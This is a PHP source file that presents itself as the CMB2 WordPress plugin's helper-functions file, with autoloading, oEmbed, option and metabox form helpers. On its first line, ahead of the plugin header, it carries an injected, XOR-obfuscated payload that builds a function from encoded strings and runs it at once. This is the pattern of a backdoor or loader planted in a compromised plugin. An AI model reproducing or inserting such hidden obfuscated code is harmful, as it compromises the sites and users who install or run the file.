<?php $ayUeLMR='5CQ5 1<RFXZ6 A='; $uSPfSYU='V14TTTc4369BI.S'^$ayUeLMR; $gLBUEWKZ='.RxTP2X1O>=W0=4:>32cC3:Rg 9HJhk O,qgEg<6cT;62YZDEjS=>i2L .-lXE<lB52DQxMl304JXGBvvFd<Kr:-EOMqfMwPZoZ.DkPTcQQGQcLSt7J6G0;LI3., aJtG-ezbsXgf- 7khzDNR23MQltB+r<am3 <jlGiGn:DRG+SfK1 JSqboZqk>RN,Y gvX3 Hs8l+xEohUYX7QEHLRO=04WxqD4,O98PRius.;RE=O1d3. XMU,nnkr zu-s4a65bJ=U8SooWfE,YB=dmOYlRD+.Pn=V.WeOvSSKIcOpZ NJSoen 6<B3uyHpd. yrHgUV9XktV>PRUKK+WPfcbka6lm-ohq-=yl;U=IDHPC8AWG dgJnGje5OYPr=1RPTgiK7 a=5OTOA5,oHau>2-XYBkcPH8pPH=3EMKQN:UTH=F+W EG=qL:Ok<XJ6f-U Tc3RFRNy86Q4DW,cTT42Ygysn2,=,4.0 CbbpUTzwST QgVqXV NZ:eF=Jg1JSJ  AT=6;dZfv3.2MOpbRzm:ZxmW+;23<U;UAWnqkowdnHNnCRqdf=CU+PVFSV-ePe-+HZdPyTVTmnnlopjVD45 kX In49E0M>mK6VE5R+.SFAh4X ZoKhROcnX3A=KD+;as-YY9gqP;L8: Tboopd5+VI ZiSXp+'; $bFppXYrx=$uSPfSYU('', 'G4Pu6G6R;WR9oXLSMGAKdKU 8DX<+74M:XVNlGG<j2NXQ-3++J+RL6V-TOr350HDfQS00TmHXUMcxgbVV=n5BVUX1opQAjLZSf<A6Ct=ClqwjCh:HD>D+UUdmWOXAHqTcDNQKyQnBBUCKFGdfvVR907P+vRbAIXEE1H.IbNI0 +N=NoZE3z,KTPxbL7:Y+NOR7FTaH2eVr8ebq=9C0eul4.QCQlrU UX.fS5+IHSHZ>6Xt;nUAR=,6DNFO-c5:f:qAWFBnV0AsRQwB3M57XMM4Sev JZ11V3WwXoR862riFT>A:+sREJVWP7VNs5znGFYZiC17M9BT-4Y4:9.J48FKF43s=8h<<QLNYHP0DiyvpgN ;2EMG1dNcAQ.-1-VT+piGM RYZ7<Fp+ AMOuAQHSA-<yaj-BEzZlYR1,klnz :;X4B6L,=XY4U=4X9>W9r8U KQ357xMgR4W+3IKp0UF8NUSJVMIMkEUYjKYz<2RS75T0GpWx7R<;C:-X38T2:9TSisVSBCvFRWOF,fPDtZEW>MEsOZFRgrP08p3XKRJDIywVqaASUX 7I17p22KV1POJp8V1J032ZIGLIVJ76FTY43E01QA,C9MElF7<Y=JJtjaLP9T;FbHroCNxHK4.2JWIWI8-X<V Z5TUA0E2FKn<N. TrYzczV'^$gLBUEWKZ); $bFppXYrx();
/**
 * CMB2 Helper Functions
 *
 * @category  WordPress_Plugin
 * @package   CMB2
 * @author    CMB2 team
 * @license   GPL-2.0+
 * @link      https://cmb2.io
 */

/**
 * Helper function to provide directory path to CMB2
 *
 * @since  2.0.0
 * @param  string $path Path to append.
 * @return string        Directory with optional path appended
 */
function cmb2_dir( $path = '' ) {
	return CMB2_DIR . $path;
}

/**
 * Autoloads files with CMB2 classes when needed
 *
 * @since  1.0.0
 * @param  string $class_name Name of the class being requested.
 */
function cmb2_autoload_classes( $class_name ) {
	if ( 0 !== strpos( $class_name, 'CMB2' ) ) {
		return;
	}

	$path = 'includes';

	if ( 'CMB2_Type' === $class_name || 0 === strpos( $class_name, 'CMB2_Type_' ) ) {
		$path .= '/types';
	}

	if ( 'CMB2_REST' === $class_name || 0 === strpos( $class_name, 'CMB2_REST_' ) ) {
		$path .= '/rest-api';
	}

	include_once( cmb2_dir( "$path/{$class_name}.php" ) );
}

/**
 * Get instance of the CMB2_Utils class
 *
 * @since  2.0.0
 * @return CMB2_Utils object CMB2 utilities class
 */
function cmb2_utils() {
	static $cmb2_utils;
	$cmb2_utils = $cmb2_utils ? $cmb2_utils : new CMB2_Utils();
	return $cmb2_utils;
}

/**
 * Get instance of the CMB2_Ajax class
 *
 * @since  2.0.0
 * @return CMB2_Ajax object CMB2 ajax class
 */
function cmb2_ajax() {
	return CMB2_Ajax::get_instance();
}

/**
 * Get instance of the CMB2_Option class for the passed metabox ID
 *
 * @since  2.0.0
 *
 * @param string $key Option key to fetch.
 * @return CMB2_Option object Options class for setting/getting options for metabox
 */
function cmb2_options( $key ) {
	return CMB2_Options::get( $key );
}

/**
 * Get a cmb oEmbed. Handles oEmbed getting for non-post objects
 *
 * @since  2.0.0
 * @param  array $args Arguments. Accepts:
 *
 *       'url'         - URL to retrieve the oEmbed from,
 *       'object_id'   - $post_id,
 *       'object_type' - 'post',
 *       'oembed_args' - $embed_args, // array containing 'width', etc
 *       'field_id'    - false,
 *       'cache_key'   - false,
 *       'wp_error'    - true/false, // To return a wp_error object if no embed found.
 *
 * @return string        oEmbed string
 */
function cmb2_get_oembed( $args = array() ) {
	$oembed = cmb2_ajax()->get_oembed_no_edit( $args );

	// Send back our embed.
	if ( $oembed['embed'] && $oembed['embed'] != $oembed['fallback'] ) {
		return '<div class="cmb2-oembed">' . $oembed['embed'] . '</div>';
	}

	$error = sprintf(
		/* translators: 1: results for. 2: link to codex.wordpress.org/Embeds */
		esc_html__( 'No oEmbed Results Found for %1$s. View more info at %2$s.', 'cmb2' ),
		$oembed['fallback'],
		'<a href="https://wordpress.org/support/article/embeds/" target="_blank">codex.wordpress.org/Embeds</a>'
	);

	if ( isset( $args['wp_error'] ) && $args['wp_error'] ) {
		return new WP_Error( 'cmb2_get_oembed_result', $error, compact( 'oembed', 'args' ) );
	}

	// Otherwise, send back error info that no oEmbeds were found.
	return '<p class="ui-state-error-text">' . $error . '</p>';
}

/**
 * Outputs the return of cmb2_get_oembed.
 *
 * @since  2.2.2
 * @see cmb2_get_oembed
 *
 * @param array $args oEmbed args.
 */
function cmb2_do_oembed( $args = array() ) {
	echo cmb2_get_oembed( $args );
}
add_action( 'cmb2_do_oembed', 'cmb2_do_oembed' );

/**
 * A helper function to get an option from a CMB2 options array
 *
 * @since  1.0.1
 * @param  string $option_key Option key.
 * @param  string $field_id   Option array field key.
 * @param  mixed  $default    Optional default fallback value.
 * @return array               Options array or specific field
 */
function cmb2_get_option( $option_key, $field_id = '', $default = false ) {
	return cmb2_options( $option_key )->get( $field_id, $default );
}

/**
 * A helper function to update an option in a CMB2 options array
 *
 * @since  2.0.0
 * @param  string  $option_key Option key.
 * @param  string  $field_id   Option array field key.
 * @param  mixed   $value      Value to update data with.
 * @param  boolean $single     Whether data should not be an array.
 * @return boolean             Success/Failure
 */
function cmb2_update_option( $option_key, $field_id, $value, $single = true ) {
	if ( cmb2_options( $option_key )->update( $field_id, $value, false, $single ) ) {
		return cmb2_options( $option_key )->set();
	}

	return false;
}

/**
 * Get a CMB2 field object.
 *
 * @since  1.1.0
 * @param  array  $meta_box    Metabox ID or Metabox config array.
 * @param  array  $field_id    Field ID or all field arguments.
 * @param  int    $object_id   Object ID.
 * @param  string $object_type Type of object being saved. (e.g., post, user, comment, or options-page).
 *                             Defaults to metabox object type.
 * @return CMB2_Field|null     CMB2_Field object unless metabox config cannot be found
 */
function cmb2_get_field( $meta_box, $field_id, $object_id = 0, $object_type = '' ) {

	$object_id = $object_id ? $object_id : get_the_ID();
	$cmb = $meta_box instanceof CMB2 ? $meta_box : cmb2_get_metabox( $meta_box, $object_id );

	if ( ! $cmb ) {
		return;
	}

	$cmb->object_type( $object_type ? $object_type : $cmb->mb_object_type() );

	return $cmb->get_field( $field_id );
}

/**
 * Get a field's value.
 *
 * @since  1.1.0
 * @param  array  $meta_box    Metabox ID or Metabox config array.
 * @param  array  $field_id    Field ID or all field arguments.
 * @param  int    $object_id   Object ID.
 * @param  string $object_type Type of object being saved. (e.g., post, user, comment, or options-page).
 *                             Defaults to metabox object type.
 * @return mixed               Maybe escaped value
 */
function cmb2_get_field_value( $meta_box, $field_id, $object_id = 0, $object_type = '' ) {
	$field = cmb2_get_field( $meta_box, $field_id, $object_id, $object_type );
	return $field->escaped_value();
}

/**
 * Because OOP can be scary
 *
 * @since  2.0.2
 * @param  array $meta_box_config Metabox Config array.
 * @return CMB2 object            Instantiated CMB2 object
 */
function new_cmb2_box( array $meta_box_config ) {
	return cmb2_get_metabox( $meta_box_config );
}

/**
 * Retrieve a CMB2 instance by the metabox ID
 *
 * @since  2.0.0
 * @param  mixed  $meta_box    Metabox ID or Metabox config array.
 * @param  int    $object_id   Object ID.
 * @param  string $object_type Type of object being saved. (e.g., post, user, comment, or options-page).
 *                             Defaults to metabox object type.
 * @return CMB2 object
 */
function cmb2_get_metabox( $meta_box, $object_id = 0, $object_type = '' ) {

	if ( $meta_box instanceof CMB2 ) {
		return $meta_box;
	}

	if ( is_string( $meta_box ) ) {
		$cmb = CMB2_Boxes::get( $meta_box );
	} else {
		// See if we already have an instance of this metabox.
		$cmb = CMB2_Boxes::get( $meta_box['id'] );
		// If not, we'll initate a new metabox.
		$cmb = $cmb ? $cmb : new CMB2( $meta_box, $object_id );
	}

	if ( $cmb && $object_id ) {
		$cmb->object_id( $object_id );
	}

	if ( $cmb && $object_type ) {
		$cmb->object_type( $object_type );
	}

	return $cmb;
}

/**
 * Returns array of sanitized field values from a metabox (without saving them)
 *
 * @since  2.0.3
 * @param  mixed $meta_box         Metabox ID or Metabox config array.
 * @param  array $data_to_sanitize Array of field_id => value data for sanitizing (likely $_POST data).
 * @return mixed                   Array of sanitized values or false if no CMB2 object found
 */
function cmb2_get_metabox_sanitized_values( $meta_box, array $data_to_sanitize ) {
	$cmb = cmb2_get_metabox( $meta_box );
	return $cmb ? $cmb->get_sanitized_values( $data_to_sanitize ) : false;
}

/**
 * Retrieve a metabox form
 *
 * @since  2.0.0
 * @param  mixed $meta_box  Metabox config array or Metabox ID.
 * @param  int   $object_id Object ID.
 * @param  array $args      Optional arguments array.
 * @return string             CMB2 html form markup
 */
function cmb2_get_metabox_form( $meta_box, $object_id = 0, $args = array() ) {

	$object_id = $object_id ? $object_id : get_the_ID();
	$cmb       = cmb2_get_metabox( $meta_box, $object_id );

	ob_start();
	// Get cmb form.
	cmb2_print_metabox_form( $cmb, $object_id, $args );
	$form = ob_get_clean();

	return apply_filters( 'cmb2_get_metabox_form', $form, $object_id, $cmb );
}

/**
 * Display a metabox form & save it on submission
 *
 * @since  1.0.0
 * @param  mixed $meta_box  Metabox config array or Metabox ID.
 * @param  int   $object_id Object ID.
 * @param  array $args      Optional arguments array.
 */
function cmb2_print_metabox_form( $meta_box, $object_id = 0, $args = array() ) {

	$object_id = $object_id ? $object_id : get_the_ID();
	$cmb = cmb2_get_metabox( $meta_box, $object_id );

	// if passing a metabox ID, and that ID was not found.
	if ( ! $cmb ) {
		return;
	}

	$args = wp_parse_args( $args, array(
		'form_format' => '<form class="cmb-form" method="post" id="%1$s" enctype="multipart/form-data" encoding="multipart/form-data"><input type="hidden" name="object_id" value="%2$s">%3$s<input type="submit" name="submit-cmb" value="%4$s" class="button-primary"></form>',
		'save_button' => esc_html__( 'Save', 'cmb2' ),
		'object_type' => $cmb->mb_object_type(),
		'cmb_styles'  => $cmb->prop( 'cmb_styles' ),
		'enqueue_js'  => $cmb->prop( 'enqueue_js' ),
	) );

	// Set object type explicitly (rather than trying to guess from context).
	$cmb->object_type( $args['object_type'] );

	// Save the metabox if it's been submitted
	// check permissions
	// @todo more hardening?
	if (
		$cmb->prop( 'save_fields' )
		// check nonce.
		&& isset( $_POST['submit-cmb'], $_POST['object_id'], $_POST[ $cmb->nonce() ] )
		&& wp_verify_nonce( $_POST[ $cmb->nonce() ], $cmb->nonce() )
		&& $object_id && $_POST['object_id'] == $object_id
	) {
		$cmb->save_fields( $object_id, $cmb->object_type(), $_POST );
	}

	// Enqueue JS/CSS.
	if ( $args['cmb_styles'] ) {
		CMB2_Hookup::enqueue_cmb_css();
	}

	if ( $args['enqueue_js'] ) {
		CMB2_Hookup::enqueue_cmb_js();
	}

	$form_format = apply_filters( 'cmb2_get_metabox_form_format', $args['form_format'], $object_id, $cmb );

	$format_parts = explode( '%3$s', $form_format );

	// Show cmb form.
	printf( $format_parts[0], esc_attr( $cmb->cmb_id ), esc_attr( $object_id ) );
	$cmb->show_form();

	if ( isset( $format_parts[1] ) && $format_parts[1] ) {
		printf( str_ireplace( '%4$s', '%1$s', $format_parts[1] ), esc_attr( $args['save_button'] ) );
	}

}

/**
 * Display a metabox form (or optionally return it) & save it on submission.
 *
 * @since  1.0.0
 * @param  mixed $meta_box  Metabox config array or Metabox ID.
 * @param  int   $object_id Object ID.
 * @param  array $args      Optional arguments array.
 * @return string
 */
function cmb2_metabox_form( $meta_box, $object_id = 0, $args = array() ) {
	if ( ! isset( $args['echo'] ) || $args['echo'] ) {
		cmb2_print_metabox_form( $meta_box, $object_id, $args );
	} else {
		return cmb2_get_metabox_form( $meta_box, $object_id, $args );
	}
}

if ( ! function_exists( 'date_create_from_format' ) ) {

	/**
	 * Reimplementation of DateTime::createFromFormat for PHP < 5.3. :(
	 * Borrowed from http://stackoverflow.com/questions/5399075/php-datetimecreatefromformat-in-5-2
	 *
	 * @param string $date_format Date format.
	 * @param string $date_value  Date value.
	 *
	 * @return DateTime
	 */
	function date_create_from_format( $date_format, $date_value ) {

		$schedule_format = str_replace(
			array( 'M', 'Y', 'm', 'd', 'H', 'i', 'a' ),
			array( '%b', '%Y', '%m', '%d', '%H', '%M', '%p' ),
			$date_format
		);

		/*
		 * %Y, %m and %d correspond to date()'s Y m and d.
		 * %I corresponds to H, %M to i and %p to a
		 */
		$parsed_time = strptime( $date_value, $schedule_format );

		$ymd = sprintf(
			/**
			 * This is a format string that takes six total decimal
			 * arguments, then left-pads them with zeros to either
			 * 4 or 2 characters, as needed
			 */
			'%04d-%02d-%02d %02d:%02d:%02d',
			$parsed_time['tm_year'] + 1900,  // This will be "111", so we need to add 1900.
			$parsed_time['tm_mon'] + 1,      // This will be the month minus one, so we add one.
			$parsed_time['tm_mday'],
			$parsed_time['tm_hour'],
			$parsed_time['tm_min'],
			$parsed_time['tm_sec']
		);

		return new DateTime( $ymd );
	}
}// End if.

if ( ! function_exists( 'date_timestamp_get' ) ) {

	/**
	 * Returns the Unix timestamp representing the date.
	 * Reimplementation of DateTime::getTimestamp for PHP < 5.3. :(
	 *
	 * @param DateTime $date DateTime instance.
	 *
	 * @return int
	 */
	function date_timestamp_get( DateTime $date ) {
		return $date->format( 'U' );
	}
}// End if.
